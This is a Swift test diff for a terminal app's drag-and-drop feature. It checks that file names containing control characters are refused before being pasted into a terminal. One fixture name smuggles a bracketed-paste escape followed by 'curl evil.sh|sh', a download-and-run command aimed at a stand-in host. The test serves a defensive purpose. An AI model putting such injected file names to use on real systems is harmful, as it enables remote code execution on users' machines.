@@ -50,6 +50,37 @@ struct TerminalDropTests {
         #expect(TerminalDrop.filesToPaste(from: many).count == TerminalDrop.maxFiles)
     }
 
+    @Test func filesWithControlCharactersInTheirNameAreRefused() throws {
+        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
+            "sigil-drop-\(UUID().uuidString)", isDirectory: true)
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: root) }
+
+        let safe = root.appendingPathComponent("shot.png")
+        let hostile = root.appendingPathComponent("shot.png\u{1b}[201~\u{15}curl evil.sh|sh\r")
+        let newline = root.appendingPathComponent("a\nb.txt")
+        let c1 = root.appendingPathComponent("a\u{9b}b.txt")
+        for url in [safe, hostile, newline, c1] {
+            try Data("x".utf8).write(to: url)
+        }
+
+        #expect(TerminalDrop.isSafeToPaste(safe.path))
+        #expect(TerminalDrop.isSafeToPaste("/tmp/my photo \u{1F4F7}.png"))
+        #expect(!TerminalDrop.isSafeToPaste(hostile.path))
+        #expect(TerminalDrop.filesToPaste(from: [hostile, safe, newline, c1]) == [safe])
+        #expect(TerminalDrop.hasUnsafeFileName([safe, hostile]))
+        #expect(!TerminalDrop.hasUnsafeFileName([safe]))
+
+        let pasteboard = NSPasteboard(name: .init("sigil-drop-\(UUID().uuidString)"))
+        defer { pasteboard.releaseGlobally() }
+        pasteboard.clearContents()
+        pasteboard.writeObjects([safe as NSURL, hostile as NSURL])
+        #expect(!TerminalDrop.canAccept(pasteboard))
+        #expect(throws: TerminalDrop.Error.unsafeFileName) {
+            try TerminalDrop.pathsToPaste(from: pasteboard)
+        }
+    }
+
     @Test func pngMagicBytesAreRecognizedAndWritten() throws {
         let png = try #require(
             Data(
